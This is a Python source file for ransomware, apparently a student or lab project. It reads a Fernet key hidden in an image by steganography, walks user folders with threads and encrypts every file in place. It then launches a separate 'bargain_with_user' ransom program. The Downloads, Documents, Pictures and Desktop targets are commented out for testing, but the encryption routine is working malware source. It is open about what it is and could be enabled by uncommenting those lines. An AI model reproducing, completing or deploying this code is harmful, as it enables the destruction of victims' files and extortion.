import os
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor
from extract import extract_message


def encrypt_file(filename: str, key: str):
    """
    Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
    :param filename: Represents the file to undergo encryption
    :param key: Represents the key to be converted to an instance of Fernet object.
    :return: None
    """
    # Converts that key to a Fernet object to gain access to Fernet methods
    f_key: Fernet = Fernet(key)
    # Assigns the data inside the unencrypted file to a variable
    with open(filename, "rb") as unencrypted_file:
        plaintext = unencrypted_file.read()
    # Encrypts the unencrypted data using the key and assigns the encrypted data to a variable
    ciphertext = f_key.encrypt(plaintext)
    # Overwrites the same file
    with open(filename, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)


def process_directory(directory: str, key: str, blacklist: list[str]):
    """
    This function processes each directory, encrypting files that are not in the blacklist.
    :param directory: Represents the path to a directory that will have its files encrypted.
    :param key: Represents the key to be converted to an instance of Fernet object.
    :param blacklist:
    :return: None
    """
    # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
    for root, dir, files in os.walk(directory):
        # Iterates through each file in the directory
        for directory in blacklist:
            dir.remove(directory)
        for file in files:
            if file not in blacklist:
                # Combines the path of the directory with the file name to create filepath of file
                file_path = os.path.join(root, file)
                # Encrypts the file given the newly generated filepath
                encrypt_file(file_path, key)
                print(file)



def main():
    # Extracts the key from a specified image
    # TODO: Update the name of the images as needed
    image_containing_key: str = "download.jpg"

    if os.path.exists(image_containing_key):
        pass
    else:
        raise FileNotFoundError(f"The image name/path '{image_containing_key}' does not exist in the current directory."
                                f"Either the name fed to the variable in the code to be updated or the image "
                                f"specified just doesn't exist.")

    key: str = extract_message(image_containing_key, "Mochi")

    # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
    # of the ransomware.
    # TODO: Verify, but SHOULD prevent the code from encrypting itself
    blacklist: list[str] = [os.getcwd()]

    encrypt_file("encrypted_file.txt", key)

    # Directories to encrypt in their entirety
    # TODO: Update as needed for testing purposes
    directories_to_encrypt = [
        #os.path.expanduser("~/Downloads"),
        #os.path.expanduser("~/Documents"),
        #os.path.expanduser("~/Pictures"),
        #os.path.expanduser("~/Desktop")
    ]

    # Start a thread for each directory
    with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
        # Submit each directory to be processed in a separate thread
        futures = [executor.submit(process_directory, directory, key, blacklist) for directory in
                   directories_to_encrypt]
        # Ensure each thread completes by calling `.result()` on each future
        for future in futures:
            future.result()

    print("Encryption successful!")

    # Runs the bargaining application
    if os.path.exists("bargain_with_user.py"):
        exec("bargain_with_user.py")
    elif os.path.exists("bargain_with_user.exe"):
        exec("bargain_with_user.exe")
    else:
        raise FileNotFoundError("Neither the .py nor the .exe file for bargaining with the user were found...")


main()